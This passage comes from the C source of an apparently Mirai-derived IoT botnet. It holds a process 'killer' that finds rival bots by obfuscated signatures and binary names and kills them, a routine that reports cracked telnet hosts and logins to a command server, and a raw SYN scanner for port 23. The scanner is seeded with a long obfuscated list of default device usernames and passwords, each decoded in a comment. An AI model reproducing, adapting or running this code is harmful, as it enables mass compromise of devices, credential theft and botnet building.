"\x47\xd0\x2a\x14\x47\xd0\x2a\x14", "\xe2\x6f\xe2\x6f\xe2\x50\x2a\x2a\x47\x50", "\x2a\xcd\x2a\xd0\x2a\x14\x47\x86\x2a\xd0", "\x2a\x9d\x2a\xd0\x2a\x47\x2a\x47\x2a\xcf\x47\x86", "\x2a\x35\x2a\x14\x47\x47\x2a\xeb\x2a\xd0\x47\xe2\x47\x6f\x2a\x14\x47\x86\x2a\xcd", "\x2a\xda\x2a\x14\x2a\xda\x2a\x9d\x2a\x14\x2a\x47\x47\x6f\x2a\x2a\x2a\x14", "\x2a\xe2\x2a\x14\x47\x86\x2a\x14\x2a\x9d\x2a\xeb", "\x2a\x6f\x47\xcf\x47\x50\x47\xe2", "\x2a\xcd\x2a\xeb\x47\xe2\x47\xcf\x47\x6f\x2a\xeb", "\x2a\x86\x2a\x14\x47\x6f\x2a\x9d\x2a\xcf\x47\x6f", "\x2a\xe2\x47\x86\x2a\xeb\x2a\xe2\x2a\x35\x2a\xcf\x2a\x6f", "\x47\xe2\x2a\xda\x47\xcf\x2a\xcd\x47\x50", "\x47\xe2\x47\x6f\x2a\x6f\x2a\x2a\x2a\xda\x2a\x14\x2a\x14\x2a\x6f", "\x47\xcf\x2a\x6f\x47\x50\x2a\x2a\x2a\xda\x2a\x14\x2a\x14\x2a\x6f", "\x47\x6f\x2a\xe2\x47\x50\x2a\x2a\x2a\xda\x2a\x14\x2a\x14\x2a\x6f", "\x2a\x9a\x47\x6f\x47\x6f\x47\x50\x2a\x2a\x2a\xda\x2a\x14\x2a\x14\x2a\x6f", "\x2a\xe2\x2a\x9a\x2a\xd0\x2a\x9d\x2a\xcf\x47\xe2\x2a\xcf\x86\x50\x2a\x2a\x2a\xeb\x2a\xcd\x2a\xd0\x2a\xda\x47\xd0", "\x47\x2a\x47\xe2\x47\x50\x2a\xeb\x47\x86\x2a\x35\x47\xa4\x47\xd0\x47\xd0", "\x47\xe2\x2a\x9a\x2a\xeb\x2a\x6f\x2a\x14\x2a\x9a", "\x2a\x14\x47\xe2\x2a\xd0\x47\x86\x2a\xd0\x47\xe2", "\x2a\x35\x2a\x14\x47\x47\x2a\xeb\x2a\xd0", "\xd0\xd0\x9a\x14\xd0\x9a\xd0\xda\x9a\x14\xd0\x9a\xcd\x50\xda\xa4\x9a\xd0\x9a\x2a\x9a\xcf\xd0\x14\x9a\x9d\x9a\xda\x9a\x2a\x9a\x35\xd0\x9a\x9a\x14\xda\x47\x9a\x6f\x9a\xcd\x9a\xe2\x9a\x6f\xd0\x86\x9d\xa4", "\xcf\xcf\x47\xe2\x2a\xcf\x47\x86\x86\xcd\x6f\xeb\x2a\x47\x2a\xcf\x2a\x9d\x47\x6f\xe2\xa4\x86\x50\x86\xcf\x47\xe2", "\x6f\x14\x6f\xcd\xcf\x2a\x6f\xa4\x6f\x47\xcf\x50", "\x6f\x6f\xcf\x47\x6f\xeb\x6f\xd0\x6f\x47\xcf\x50", "\x6f\x9a\xcf\xcf\x6f\xeb\xcf\x47\x6f\xcf\x6f\xd0\xcf\xcf\xcf\x50\x6f\x9d\xcf\x50", "\xcf\x50\x6f\x14\x6f\x9d\x6f\x47\x86\x50\x6f\x9d\x6f\xd0\x6f\x47\x6f\x47\x6f\xeb", "\xcf\x50\x6f\x14\xcf\xe2\xcf\x6f\x86\x50\x86\x14\x2a\xe2\x47\x6f\x47\x86\x2a\xda\x47\x6f\x86\x14\x6f\x6f\x2a\xcf\x47\x2a\x2a\xd0\x2a\xe2\x2a\xcf\xcf\xcf\x47\x50\x2a\x47\x47\x86\x2a\xeb\x2a\x6f\x2a\xcf\xcf\x14\xe2\xeb", "\x2a\x6f\x2a\xeb\x47\x6f\x2a\xeb\x2a\x47\x47\x86\x2a\xeb\x2a\xcd\x86\x50\x2a\xda\x2a\xd0\x47\xe2\x47\x6f\x2a\xcf\x2a\x9d\x2a\xcf\x47\x86"
};

int mem_exists(char *buf, int buf_len, char *str, int str_len)
{
    int matches = 0;

    if (str_len > buf_len)
        return 0;

    while (buf_len--)
    {
        if (*buf++ == str[matches])
        {
            if (++matches == str_len)
                return 1;
        }
        else
            matches = 0;
    }

    return 0;
}
int coil_pid;
char *coil_exe;
int coil_exe_len = 0;

int aiuf(void)
{
    char path[PATH_MAX], *ptr_path = path, tmp[16];
    int fd, k_rp_len;

    // Copy /proc/$pid/exe into path
    ptr_path += util_strcpy(ptr_path, eika("\x27\xa0\xe7\xb9\xce\x27"));
    ptr_path += util_strcpy(ptr_path, util_itoa(getpid(), 10, tmp));
    ptr_path += util_strcpy(ptr_path, eika("\x27\x51\xc1\x51"));

    // Try to open file
    if ((fd = open(path, O_RDONLY)) == -1)
    {
        return 0;
    }
    close(fd);

    if ((k_rp_len = readlink(path, coil_exe, PATH_MAX - 1)) != -1)
    {
        coil_exe[k_rp_len] = 0;
    }

    util_zero(path, ptr_path - path);

    return 1;
}

int d8ds(char *path)
{
    int fd, ret;
    char rdbuf[4096];
    int found = 0;
    int i;
    if ((fd = open(path, O_RDONLY)) == -1) return 0;
    unsigned char searchFor[64];
    util_zero(searchFor, sizeof(searchFor));
    while ((ret = read(fd, rdbuf, sizeof (rdbuf))) > 0)
    {
        for (i = 0; i < NUMITEMS(knownBots); i++) {
            hex2bin(eika(knownBots[i]), util_strlen(knownBots[i]), searchFor);
            if (mem_exists(rdbuf, ret, searchFor, util_strlen(searchFor))){
                found = 1;
                break;
            }
            util_zero(searchFor, sizeof(searchFor));
        }
        
    }

    close(fd);

    return found;
}
#define coil_MIN_PID              400
#define coil_RESTART_SCAN_TIME    1

int coil_start(uint16_t port)
{
    DIR *dir, *fd_dir;
    struct dirent *entry, *fd_entry;
    char path[PATH_MAX] = {0}, exe[PATH_MAX] = {0}, buffer[512] = {0};
    int pid = 0, fd = 0;
    char inode[16] = {0};
    char *ptr_path = path;
    int ret = 0;
    char port_str[16];
 
 
    util_itoa(ntohs(port), 16, port_str);
    if (strlen(port_str) == 2)
    {
        port_str[2] = port_str[0];
        port_str[3] = port_str[1];
        port_str[4] = 0;
 
        port_str[0] = '0';
        port_str[1] = '0';
    }
 
    fd = open("/proc/net/tcp", O_RDONLY);
    if (fd == -1)
        return 0;
 
    while(util_fdgets(buffer, 512, fd) != NULL)
    {
        int i = 0, ii = 0;
 
        while (buffer[i] != 0 && buffer[i] != ':')
            i++;
 
        if (buffer[i] == 0) continue;
        i += 2;
        ii = i;
 
        while (buffer[i] != 0 && buffer[i] != ' ')
            i++;
        buffer[i++] = 0;
 
        if (util_stristr(&(buffer[ii]), strlen(&(buffer[ii])), port_str) != -1)
        {
            int column_index = 0;
            int in_column = 0;
            int listening_state = 0;
 
            while (column_index < 7 && buffer[++i] != 0)
            {
                if (buffer[i] == ' ' || buffer[i] == '\t')
                    in_column = 1;
                else
                {
                    if (in_column == 1)
                        column_index++;
 
                    if (in_column == 1 && column_index == 1 && buffer[i + 1] == 'A')
                    {
                        listening_state = 1;
                    }
 
                    in_column = 0;
                }
            }
            ii = i;
 
            if (listening_state == 0)
                continue;
 
            while (buffer[i] != 0 && buffer[i] != ' ')
                i++;
            buffer[i++] = 0;
 
            if (strlen(&(buffer[ii])) > 15)
                continue;
 
            strcpy(inode, &(buffer[ii]));
            break;
        }
    }
    close(fd);
 
    if (strlen(inode) == 0)
    {
        return 0;
    }
    if ((dir = opendir(eika("\x27\xa0\xe7\xb9\xce\x27"))) != NULL)
    {
        while ((entry = readdir(dir)) != NULL && ret == 0)
        {
            char *pid = entry->d_name;
 
            if (*pid < '0' || *pid > '9')
                continue;
 
            strcpy(ptr_path, eika("\x27\xa0\xe7\xb9\xce\x27"));
            strcpy(ptr_path + strlen(ptr_path), pid);
            strcpy(ptr_path + strlen(ptr_path), eika("\x27\x51\xc1\x51"));
 
            if (readlink(path, exe, PATH_MAX) == -1)
                continue;
 
            strcpy(ptr_path, eika("\x27\xa0\xe7\xb9\xce\x27"));
            strcpy(ptr_path + strlen(ptr_path), pid);
            strcpy(ptr_path + strlen(ptr_path), "/fd");
            if ((fd_dir = opendir(path)) != NULL)
            {
                while ((fd_entry = readdir(fd_dir)) != NULL && ret == 0)
                {
                    char *fd_str = fd_entry->d_name;
 
                    bzero(exe, PATH_MAX);
                    strcpy(ptr_path, "/proc/");
                    strcpy(ptr_path + strlen(ptr_path), pid);
                    strcpy(ptr_path + strlen(ptr_path), "/fd");
                    strcpy(ptr_path + strlen(ptr_path), "/");
                    strcpy(ptr_path + strlen(ptr_path), fd_str);
                    if (readlink(path, exe, PATH_MAX) == -1)
                        continue;

					if (strstr(path, ".armv7l") != NULL || strstr(path, ".arm7") != NULL || strstr(path, "armv7l.") != NULL || strstr(path, "arm7.") != NULL)
					{
#ifdef DEBUG
						printf("[killer] killing harmfull exe %s\n", exe);
#else
						kill(util_atoi(pid, 10), 9);
#endif
					}
					if (strstr(path, ".armv6l") != NULL || strstr(path, ".arm6") != NULL || strstr(path, "armv6l.") != NULL || strstr(path, "arm6.") != NULL)
					{
#ifdef DEBUG
						printf("[killer] killing harmfull exe %s\n", exe);
#else
						kill(util_atoi(pid, 10), 9);
#endif
					}
				
					if (strstr(path, ".armv5l") != NULL || strstr(path, ".arm5") != NULL || strstr(path, "armv5l.") != NULL || strstr(path, "arm5.") != NULL)
					{
#ifdef DEBUG
						printf("[killer] killing harmfull exe %s\n", exe);
#else
						kill(util_atoi(pid, 10), 9);
#endif
					}
					if (strstr(path, ".armv4l") != NULL || strstr(path, ".arm4") != NULL || strstr(path, "armv4l.") != NULL || strstr(path, "arm4.") != NULL)
					{
#ifdef DEBUG
						printf("[killer] killing harmfull exe %s\n", exe);
#else
						kill(util_atoi(pid, 10), 9);
#endif
					}
					if (strstr(path, ".mipsel") != NULL || strstr(path, ".mpsl") != NULL || strstr(path, "mipsel.") != NULL || strstr(path, "mpsl.") != NULL)
					{
#ifdef DEBUG
						printf("[killer] killing harmfull exe %s\n", exe);
#else
						kill(util_atoi(pid, 10), 9);
#endif
					}
					if (strstr(path, ".mips") != NULL || strstr(path, "mips.") != NULL)
					{
#ifdef DEBUG
						printf("[killer] killing harmfull exe %s\n", exe);
#else
						kill(util_atoi(pid, 10), 9);
#endif
					}
					if (strstr(path, ".sh4") != NULL || strstr(path, "sh4.") != NULL)
					{
#ifdef DEBUG
						printf("[killer] killing harmfull exe %s\n", exe);
#else
						kill(util_atoi(pid, 10), 9);
#endif
					}
					if (strstr(path, ".ppc") != NULL || strstr(path, "ppc.") != NULL)
					{
#ifdef DEBUG
						printf("[killer] killing harmfull exe %s\n", exe);
#else
						kill(util_atoi(pid, 10), 9);
#endif
					}
					if (strstr(path, ".i686") != NULL || strstr(path, "i686.") != NULL || strstr(path, ".x86") != NULL || strstr(path, "x86.") != NULL)
					{
#ifdef DEBUG
						printf("[killer] killing harmfull exe %s\n", exe);
#else
						kill(util_atoi(pid, 10), 9);
#endif
					}
					if (strstr(path, ".i586") != NULL || strstr(path, "i586.") != NULL || strstr(path, ".x86") != NULL || strstr(path, "x86.") != NULL)
					{
#ifdef DEBUG
						printf("[killer] killing harmfull exe %s\n", exe);
#else
						kill(util_atoi(pid, 10), 9);
#endif
					}
                        
                    
                    if (util_stristr(exe, strlen(exe), inode) != -1)
                    {
                        kill(util_atoi(pid, 10), 9);
                        ret = 1;
                    }
                }
                closedir(fd_dir);
            }
        }
        closedir(dir);
    }
 
    return ret;
}
 
static void report_working(uint32_t daddr, int dport, struct scanner_auth *auth, int sock)
{
    struct sockaddr_in addr;
    int pid = fork(), fd;
    struct resolv_entries *entries = NULL;
 
    if (pid > 0 || pid == -1)
        return;
 
   union {
       uint32_t raw;
       uint8_t octet[4];
   } ip;
   ip.raw = daddr;
struct in_addr ip_addr;
    ip_addr.s_addr = daddr;
//    printf("The IP address is %s\n", inet_ntoa(ip_addr));    
int scanSock;
    
    sockprintf(fd_cnc, "TEL %s:%d %s:%s\n", inet_ntoa(ip_addr), dport, auth->username,auth->password);
 
#ifdef DEBUG
    printf("[report] Send scan result to loader\n");
#endif//1.227.97.33:23 root:default

    _exit(0);
}
 
 
void scanner_xywz(int sock)
{
    int i;
    uint16_t source_port;
    struct iphdr *iph;
    struct tcphdr *tcph;
 
    // Let parent continue on main thread
    scanner_pid = fork();
    if (scanner_pid > 0 || scanner_pid == -1)
        return;
 
 
    rand_xywz();
    fake_time = time(NULL);
    conn_table = calloc(SCANNER_MAX_CONNS, sizeof (struct scanner_connection));
    for (i = 0; i < SCANNER_MAX_CONNS; i++)
    {
        conn_table[i].state = SC_CLOSED;
        conn_table[i].fd = -1;
    }
 
    // Set up raw socket scanning and payload
    if ((rsck = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
#ifdef DEBUG
        printf("[scanner] Failed to initialize raw socket, cannot scan\n");
#endif
        _exit(0);
    }
    fcntl(rsck, F_SETFL, O_NONBLOCK | fcntl(rsck, F_GETFL, 0));
    i = 1;
    if (setsockopt(rsck, IPPROTO_IP, IP_HDRINCL, &i, sizeof (i)) != 0)
    {
#ifdef DEBUG
        printf("[scanner] Failed to set IP_HDRINCL, cannot scan\n");
#endif
        close(rsck);
        _exit(0);
    }
 
    do
    {
        source_port = rand_next() & 0xffff;
    }
    while (ntohs(source_port) < 1024);
 
    iph = (struct iphdr *)scanner_rawpkt;
    tcph = (struct tcphdr *)(iph + 1);
 
    // Set up IPv4 header
    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = HTONS(sizeof (struct iphdr) + sizeof (struct tcphdr));
    iph->id = rand_next();
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
 
    // Set up TCP header
    tcph->dest = HTONS(23);
    tcph->source = source_port;
    tcph->doff = 5;
    tcph->window = rand_next() & 0xffff;
    tcph->syn = 1;
 // Set up passwords
	add_auth_entry("\x50\x4D\x4D\x56", "", 4);											   //root:
	add_auth_entry("\x43\x46\x4F\x4B\x4C", "", 5);										   //admin:
	add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x41\x11\x17\x13\x13", 10);					   //root:xc3511
	add_auth_entry("\x50\x4D\x4D\x56", "\x54\x4B\x58\x5A\x54", 9);						   //root:vizxv
	add_auth_entry("\x50\x4D\x4D\x56", "\x43\x46\x4F\x4B\x4C", 8);						   //root:admin
	add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x43\x46\x4F\x4B\x4C", 7);					   //admin:admin
	add_auth_entry("\x50\x4D\x4D\x56", "\x1A\x1A\x1A\x1A\x1A\x1A", 6);					   //root:888888
	add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x4F\x4A\x46\x4B\x52\x41", 5);				   //root:xmhdipc
	add_auth_entry("\x50\x4D\x4D\x56", "\x46\x47\x44\x43\x57\x4E\x56", 5);				   //root:default
	add_auth_entry("\x50\x4D\x4D\x56", "\x48\x57\x43\x4C\x56\x47\x41\x4A", 5);			   //root:juantech
	add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16\x17\x14", 5);					   //root:123456
	add_auth_entry("\x50\x4D\x4D\x56", "\x17\x16\x11\x10\x13", 5);						   //root:54321
	add_auth_entry("\x46\x47\x44\x43\x57\x4E\x56", "\x46\x47\x44\x43\x57\x4E\x56", 7);	   //default:default
	add_auth_entry("\x46\x47\x44\x43\x57\x4E\x56", "", 7);                           	   //default:
	add_auth_entry("\x51\x57\x52\x52\x4D\x50\x56", "\x51\x57\x52\x52\x4D\x50\x56", 5);	   //support:support
	add_auth_entry("\x51\x57\x52\x52\x4D\x50\x56", "\x43\x46\x4F\x4B\x4C", 7);			   //support:admin
	add_auth_entry("\x51\x57\x52\x52\x4D\x50\x56", "\x13\x10\x11\x16", 7);				   //support:1234
	add_auth_entry("\x51\x57\x52\x52\x4D\x50\x56", "\x13\x10\x11\x16\x17\x14", 7);		   //support:123456
	add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x51\x57\x52\x52\x4D\x50\x56", 7);			   //admin:support
	add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x52\x43\x51\x51\x55\x4D\x50\x46", 4);		   //admin:password
	add_auth_entry("\x50\x4D\x4D\x56", "\x50\x4D\x4D\x56", 4);							   //root:root
	add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16\x17", 4);						   //root:12345
	add_auth_entry("\x57\x51\x47\x50", "", 4);											   //user:
	add_auth_entry("\x57\x51\x47\x50", "\x57\x51\x47\x50", 4);							   //user:user
	add_auth_entry("\x57\x51\x47\x50", "\x13\x10\x11\x16\x17\x14", 6);					   //user:123456
	add_auth_entry("\x50\x4D\x4D\x56", "\x52\x43\x51\x51", 3);							   //root:pass
	add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x43\x46\x4F\x4B\x4C\x13\x10\x11\x16", 3);	   //admin:admin1234
	add_auth_entry("\x50\x4D\x4D\x56", "\x13\x13\x13\x13", 4);							   //root:1111
	add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x51\x4F\x41\x43\x46\x4F\x4B\x4C", 8);		   //admin:smcadmin
	add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x13\x13\x13", 2);						   //admin:1111
	add_auth_entry("\x50\x4D\x4D\x56", "\x14\x14\x14\x14\x14\x14", 2);					   //root:666666
	add_auth_entry("\x50\x4D\x4D\x56", "\x52\x43\x51\x51\x55\x4D\x50\x46", 2);			   //root:password
	add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16", 4);							   //root:1234
	add_auth_entry("\x50\x4D\x4D\x56", "\x49\x4E\x54\x13\x10\x11", 1);					   //root:klv123
	add_auth_entry("\x63\x46\x4F\x4B\x4C\x4B\x51\x56\x50\x43\x56\x4D\x50", "", 13);        //administrator:
	add_auth_entry("\x63\x46\x4F\x4B\x4C\x4B\x51\x56\x50\x43\x56\x4D\x50", "\x4F\x47\x4B\x4C\x51\x4F", 13);  //administrator:admin
	add_auth_entry("\x63\x46\x4F\x4B\x4C\x4B\x51\x56\x50\x43\x56\x4D\x50", "\x40\x57\x4A", 13);			  //administrator:buh
	add_auth_entry("\x63\x46\x4F\x4B\x4C\x4B\x51\x56\x50\x43\x56\x4D\x50", "\x52\x57\x40\x4E\x4B\x41", 13);  //administrator:public
	add_auth_entry("\x51\x47\x50\x54\x4B\x41\x47", "\x51\x47\x50\x54\x4B\x41\x47", 1);	   //service://service
	add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x51\x47\x50\x54\x4B\x41\x47", 7);			   //admin://service
	add_auth_entry("\x51\x57\x52\x47\x50\x54\x4B\x51\x4D\x50", "\x51\x57\x52\x47\x50\x54\x4B\x51\x4D\x50", 10);  //supervisor:supervisor
	add_auth_entry("\x45\x57\x47\x51\x56", "", 5);					                       //guest:
	add_auth_entry("\x45\x57\x47\x51\x56", "\x45\x57\x47\x51\x56", 5);					   //guest:guest
	add_auth_entry("\x45\x57\x47\x51\x56", "\x13\x10\x11\x16\x17", 5);					   //guest:12345
	add_auth_entry("\x45\x57\x47\x51\x56", "\x13\x10\x11\x16\x17\x14", 6);				   //guest:123456
	add_auth_entry("\x43\x46\x4F\x4B\x4C\x13", "\x52\x43\x51\x51\x55\x4D\x50\x46", 1);	   //admin1:password
	add_auth_entry("\x43\x46\x4F\x4B\x4C\x4B\x51\x56\x50\x43\x56\x4D\x50", "\x13\x10\x11\x16", 13);  //administrator:1234
	add_auth_entry("\x14\x14\x14\x14\x14\x14", "\x14\x14\x14\x14\x14\x14", 6);			   //666666:666666
	add_auth_entry("\x1A\x1A\x1A\x1A\x1A\x1A", "\x1A\x1A\x1A\x1A\x1A\x1A", 6);			   //888888:888888
	add_auth_entry("\x57\x40\x4C\x56", "\x57\x40\x4C\x56", 4);							   //ubnt:ubnt
	add_auth_entry("\x50\x4D\x4D\x56", "\x57\x40\x4C\x56", 4);							   //root:ubnt
	add_auth_entry("\x50\x4D\x4D\x56", "\x49\x4E\x54\x13\x10\x11\x16", 11);				   //root:klv1234
	add_auth_entry("\x50\x4D\x4D\x56", "\x78\x56\x47\x17\x10\x13", 10);					   //root:Zte521
	add_auth_entry("\x50\x4D\x4D\x56", "\x4A\x4B\x11\x17\x13\x1A", 10);					   //root:hi3518
	add_auth_entry("\x50\x4D\x4D\x56", "\x48\x54\x40\x58\x46", 9);						   //root:jvbzd
	add_auth_entry("\x50\x4D\x4D\x56", "\x43\x4C\x49\x4D", 8);							   //root:anko
	add_auth_entry("\x50\x4D\x4D\x56", "\x58\x4E\x5A\x5A\x0C", 9);						   //root:zlxx.
	add_auth_entry("\x50\x4D\x4D\x56", "\x41\x4A\x43\x4C\x45\x47\x4F\x47", 12);			   //root:changeme
	add_auth_entry("\x50\x4D\x4D\x56", "\x15\x57\x48\x6F\x49\x4D\x12\x54\x4B\x58\x5A\x54", 1);  //root:7ujMko0vizxv
	add_auth_entry("\x50\x4D\x4D\x56", "\x15\x57\x48\x6F\x49\x4D\x12\x43\x46\x4F\x4B\x4C", 1);  //root:7ujMko0admin
	add_auth_entry("\x50\x4D\x4D\x56", "\x51\x5B\x51\x56\x47\x4F", 1);					   //root:system
	add_auth_entry("\x50\x4D\x4D\x56", "\x4B\x49\x55\x40", 1);							   //root:ikwb
	add_auth_entry("\x50\x4D\x4D\x56", "\x46\x50\x47\x43\x4F\x40\x4D\x5A", 1);			   //root:dreambox
	add_auth_entry("\x50\x4D\x4D\x56", "\x57\x51\x47\x50", 1);							   //root:user
	add_auth_entry("\x50\x4D\x4D\x56", "\x50\x47\x43\x4E\x56\x47\x49", 1);				   //root:realtek
	add_auth_entry("\x50\x4D\x4D\x56", "\x12\x12\x12\x12\x12\x12\x12\x12", 8);			   //root:00000000
	add_auth_entry("\x50\x4D\x4D\x56", "\x12\x12\x12\x12\x12\x12", 6);			           //root:000000
	add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x13\x13\x13\x13\x13\x13", 1);			   //admin:1111111
	add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x10\x11\x16", 5);						   //admin:1234
	add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x10\x11\x16\x17", 1);					   //admin:12345
	add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x17\x16\x11\x10\x13", 1);					   //admin:54321
	add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x10\x11\x16\x17\x14", 1);				   //admin:123456
	add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x15\x57\x48\x6F\x49\x4D\x12\x43\x46\x4F\x4B\x4C", 1);  //admin:7ujMko0admin
	add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x43\x46\x4F\x4B\x4C\x13\x10\x11", 8);		   //admin:admin123
	add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x52\x43\x51\x51", 1);						   //admin:pass
	add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x4F\x47\x4B\x4C\x51\x4F", 1);				   //admin:meinsm
	add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x56\x47\x41\x4A", 5);						   //admin:tech
	add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x1B\x1B\x1B\x1B\x1B\x1B\x1B\x1B", 8);		   //admin:99999999
	add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x6F\x47\x4B\x4C\x51", 5);					   //admin:Meins
	add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x68\x74\x61", 5);							   //admin:JVC
	add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x16\x11\x10\x13", 5);						   //admin:4321
	add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x13\x13\x13\x13\x13\x13\x13", 8);		   //admin:11111111
	add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x57\x56\x51\x56\x43\x50", 6);				   //admin:utstar
	add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x58\x4D\x4D\x4F\x43\x46\x51\x4E", 8);		   //admin:zoomadsl
	add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x43\x46\x4F\x4B\x4C\x12\x12", 7);			   //admin://admin00
	add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x4B\x52\x10\x12", 5);						   //admin:ip20
	add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x4B\x52\x11\x12\x12\x12", 6);				   //admin:ip3000
	add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x4B\x52\x16\x12\x12", 5);					   //admin:ip400
	add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x40\x4B\x4C\x56\x47\x41", 6);				   //admin:bintec
	add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x56\x51\x57\x4C\x43\x4F\x4B", 7);			   //admin:tsunami
	add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x43\x40\x41\x13\x10\x11", 6);				   //admin:abc123
	add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x52\x57\x40\x4E\x4B\x41", 6);				   //admin:public
	add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x10\x14\x12\x13\x4A\x5A", 6);				   //admin:2601hx
	add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x51\x5B\x4C\x4C\x47\x56", 7);				   //admin:synnet
	add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x40\x43\x5B\x43\x4C\x46\x51\x4E", 8);		   //admin:bayandsl
	add_auth_entry("\x53\x57\x51\x47\x50", "\x53\x57\x51\x47\x50", 5);					   //quser:quser
	add_auth_entry("\x56\x47\x41\x4A", "\x56\x47\x41\x4A", 4);							   //tech:tech
	add_auth_entry("\x56\x47\x41\x4A", "", 1);											   //tech:
	add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11", 1);								   //root:123
	add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16\x17\x14\x15", 7);				   //root:1234567
	add_auth_entry("\x6F\x43\x4C\x43\x45\x47\x50", "", 7);								   //Manager:
	add_auth_entry("\x6F\x43\x4C\x43\x45\x47\x50", "\x6F\x43\x4C\x43\x45\x47\x50", 7);	   //Manager:Manager
	add_auth_entry("\x43\x46\x4F", "", 3);												   //adm:
	add_auth_entry("\x4F\x43\x4C\x43\x45\x47\x50", "\x44\x50\x4B\x47\x4C\x46", 7);		   //manager:friend
	add_auth_entry("\x43\x52\x41", "\x43\x52\x41", 3);									   //apc:apc
	add_auth_entry("\x50\x4D\x4D\x56", "\x4D\x47\x4E\x4B\x4C\x57\x5A\x13\x10\x11", 10);	   //root:oelinux123
	add_auth_entry("\x50\x4D\x4D\x56", "\x56\x4B\x4C\x4B", 4);							   //root:tini
	add_auth_entry("\x43\x51\x41\x47\x4C\x46", "\x43\x51\x41\x47\x4C\x46", 6);			   //ascend:ascend
	add_auth_entry("", "\x43\x51\x41\x47\x4C\x46", 6);									   //(none):ascend
	add_auth_entry("\x66\x0F\x6E\x4B\x4C\x49", "\x66\x0F\x6E\x4B\x4C\x49", 6);			   //D-Link:D-Link
	add_auth_entry("\x46\x4E\x4B\x4C\x49", "\x46\x47\x44\x43\x57\x4E\x56", 7);			   //dlink:default
	add_auth_entry("\x4E\x4D\x45\x4B\x4C", "\x57\x51\x47\x50", 5);                         //login:user
	add_auth_entry("\x4E\x4D\x45\x4B\x4C", "\x52\x43\x51\x51", 5);                         //login:pass
	add_auth_entry("\x4E\x4D\x45\x4B\x4C", "\x43\x46\x4F\x4B\x4C", 5);					   //login:admin
	add_auth_entry("\x03\x50\x4D\x4D\x56", "", 5);										   // !root:
	add_auth_entry("\x41\x43\x40\x4E\x47\x41\x4D\x4F", "\x50\x4D\x57\x56\x47\x50", 8);	   //cablecom:router
	add_auth_entry("\x4C\x47\x56\x4D\x52\x4B\x43", "\x4C\x47\x56\x4D\x52\x4B\x43", 7);	   //netopia:netopia
	add_auth_entry("\x51\x5B\x51\x43\x46\x4F", "\x51\x5B\x51\x43\x46\x4F", 7);			   //sysadm:sysadm
	add_auth_entry("\x51\x5B\x51\x43\x46\x4F", "\x43\x4C\x4B\x41\x57\x51\x56", 7);		   //sysadm:anicust
	add_auth_entry("\x46\x47\x40\x57\x45", "\x46\x0C\x47\x0C\x40\x0C\x57\x0C\x45", 9);	   //debug:d.e.b.u.g
	add_auth_entry("\x46\x47\x40\x57\x45", "\x51\x5B\x4C\x4C\x47\x56", 6);				   //debug:synnet
	add_auth_entry("\x47\x41\x4A\x4D", "\x47\x41\x4A\x4D", 4);							   //echo:echo
	add_auth_entry("\x46\x4B\x43\x45", "\x51\x55\x4B\x56\x41\x4A", 6);					   //diag:switch
	add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x51\x55\x4B\x56\x41\x4A", 6);				   //admin:switch
	add_auth_entry("\x46\x4F", "\x56\x47\x4E\x4C\x47\x56", 6);							   //dm:telnet
	add_auth_entry("\x56\x47\x4E\x4C\x47\x56", "\x56\x47\x4E\x4C\x47\x56", 6);			   //telnet:telnet
	add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x10\x11\x16\x17\x14\x15\x1A\x1B\x12", 10);	 //admin:1234567890
	add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16\x17\x14\x15\x1A\x1B\x12", 10);		 //root:1234567890
	add_auth_entry("\x50\x4D\x4D\x56", "\x56\x4D\x4D\x50", 4);								 //root:toor
	add_auth_entry("\x50\x4D\x4D\x56", "\x41\x43\x4E\x54\x4B\x4C", 6);					   //root:calvin
	add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16\x53\x55\x47\x50", 8);			   //root:1234qwer
	add_auth_entry("\x50\x4D\x4D\x56", "\x50\x4D\x4D\x56\x13\x10\x11", 7);				   //root:root123
	add_auth_entry("\x50\x4D\x4D\x56", "\x43\x4A\x47\x56\x58\x4B\x52\x1A", 8);			   //root:ahetzip8
